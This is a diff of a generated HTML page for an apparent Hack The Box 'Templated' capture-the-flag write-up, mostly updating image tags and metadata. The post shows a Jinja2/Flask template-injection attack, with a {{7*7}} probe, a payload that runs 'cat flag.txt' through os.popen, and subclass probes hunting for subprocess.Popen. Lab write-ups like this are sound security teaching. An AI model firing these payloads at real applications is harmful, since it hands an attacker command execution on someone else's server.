@@ -6,14 +6,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="author" content="">
 <meta name="description" content="Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
-![Pasted image 20211226121920.png](&amp;quot;/images/Pasted image 20211226121920.png&amp;quot;)
 Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
-![[Pasted image 20211226121844.png]]
 We know that it is Jinja2 and Flask, so we can use their payload.
 Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
-![[Pasted image 20211226182358.png]]
 Alternative Finding subprocess.Popen index.
- GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list !" />
+ GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&amp;gt; Popen is there in the list GET /{{&#39;&#39;." />
 <meta name="keywords" content=", hackthebox, challenges, web, js, writeup" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -50,44 +47,35 @@ Alternative Finding subprocess.Popen index.
 
 <meta itemprop="name" content="HTB Templated - Writeup">
 <meta itemprop="description" content="Navigating through the website Requested: GET /invalid -&gt; we got invalid
-![Pasted image 20211226121920.png](&quot;/images/Pasted image 20211226121920.png&quot;)
 Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&gt; we got invalid49 instead of invalid{{7*7}}
-![[Pasted image 20211226121844.png]]
 We know that it is Jinja2 and Flask, so we can use their payload.
 Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&gt; we got the flag
-![[Pasted image 20211226182358.png]]
 Alternative Finding subprocess.Popen index.
- GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&gt; Popen is there in the list !"><meta itemprop="datePublished" content="2021-12-26T00:00:00&#43;00:00" />
+ GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&gt; Popen is there in the list GET /{{&#39;&#39;."><meta itemprop="datePublished" content="2021-12-26T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2021-12-26T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="123"><meta itemprop="image" content="https://harshitm98.github.io/"/>
+<meta itemprop="wordCount" content="109"><meta itemprop="image" content="https://harshitm98.github.io/"/>
 <meta itemprop="keywords" content="hackthebox,challenges,web,js,writeup," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://harshitm98.github.io/"/>
 
 <meta name="twitter:title" content="HTB Templated - Writeup"/>
 <meta name="twitter:description" content="Navigating through the website Requested: GET /invalid -&gt; we got invalid
-![Pasted image 20211226121920.png](&quot;/images/Pasted image 20211226121920.png&quot;)
 Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&gt; we got invalid49 instead of invalid{{7*7}}
-![[Pasted image 20211226121844.png]]
 We know that it is Jinja2 and Flask, so we can use their payload.
 Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&gt; we got the flag
-![[Pasted image 20211226182358.png]]
 Alternative Finding subprocess.Popen index.
- GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&gt; Popen is there in the list !"/>
+ GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&gt; Popen is there in the list GET /{{&#39;&#39;."/>
 
 
 
 
     <meta property="og:title" content="HTB Templated - Writeup" />
 <meta property="og:description" content="Navigating through the website Requested: GET /invalid -&gt; we got invalid
-![Pasted image 20211226121920.png](&quot;/images/Pasted image 20211226121920.png&quot;)
 Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&gt; we got invalid49 instead of invalid{{7*7}}
-![[Pasted image 20211226121844.png]]
 We know that it is Jinja2 and Flask, so we can use their payload.
 Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&gt; we got the flag
-![[Pasted image 20211226182358.png]]
 Alternative Finding subprocess.Popen index.
- GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&gt; Popen is there in the list !" />
+ GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&gt; Popen is there in the list GET /{{&#39;&#39;." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://harshitm98.github.io/posts/htb-challenge-templated/" /><meta property="og:image" content="https://harshitm98.github.io/"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-12-26T00:00:00&#43;00:00" />
@@ -183,19 +171,19 @@ Alternative Finding subprocess.Popen index.
       <div class="post-content">
         <h2 id="navigating-through-the-website">Navigating through the website</h2>
 <p>Requested: <code>GET /invalid</code> -&gt; we got <code>invalid</code></p>
-<p>![Pasted image 20211226121920.png](&quot;/images/Pasted image 20211226121920.png&quot;)</p>
+<p><img src="/img/templated/Pasted%20image%2020211226121920.png" alt=""></p>
 <h2 id="verifying-if-ssti-is-possible">Verifying if SSTI is possible</h2>
 <p>Requested: <code>GET /invalid{{7*7}}</code> -&gt; we got <code>invalid49</code> instead of <code>invalid{{7*7}}</code></p>
-<p>![[Pasted image 20211226121844.png]]</p>
+<p><img src="/img/templated/Pasted%20image%2020211226121844.png" alt=""></p>
 <p>We know that it is Jinja2 and Flask, so we can use their payload.</p>
 <h2 id="getting-the-flag">Getting the flag</h2>
 <p>Requested: <code>GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}</code> -&gt; we got the flag</p>
-<p>![[Pasted image 20211226182358.png]]</p>
+<p><img src="/img/templated/Pasted%20image%2020211226182358.png" alt=""></p>
 <h3 id="alternative">Alternative</h3>
 <p><strong>Finding <code>subprocess.Popen</code> index.</strong></p>
 <ol>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[100:]</code> -&gt; Popen is there in the list
-![[Pasted image 20211226184612.png]]</li>
+<img src="/img/templated/Pasted%20image%2020211226184612.png" alt=""></li>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[300:]</code> -&gt; Popen is there in the list</li>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[500:]</code> -&gt; Internal Server Error</li>
 <li><code>GET /{{''.__class__.mro()[1].__subclasses__()[400:]</code> -&gt; Popen is there in the list</li>
@@ -238,7 +226,7 @@ Alternative Finding subprocess.Popen index.
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        123 Words
+        109 Words
       </p>
 
       <p>
@@ -369,6 +357,13 @@ Alternative Finding subprocess.Popen index.
             
 
             
+            <span class="button next">
+                <a href="https://harshitm98.github.io/posts/htb-machine-previse/">
+                    <span class="button__text">HTB Previse - Writeup</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
         </div>
     </div>
 
@@ -394,7 +389,7 @@ Alternative Finding subprocess.Popen index.
 
 
 
-<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+<script type="text/javascript" src="/bundle.min.72f3cdb1757e654c5aa1329a4269ea6a8d7b37513de3b9d54d7a5ca25573fb3a64f872d6c36cdb2acf759068fd27157cda3ac3827a42378d38946a025e58b6e6.js" integrity="sha512-cvPNsXV&#43;ZUxaoTKaQmnqao17N1E947nVTXpcolVz&#43;zpk&#43;HLWw2zbKs91kGj9JxV82jrDgnpCN404lGoCXli25g=="></script>
 
 
 
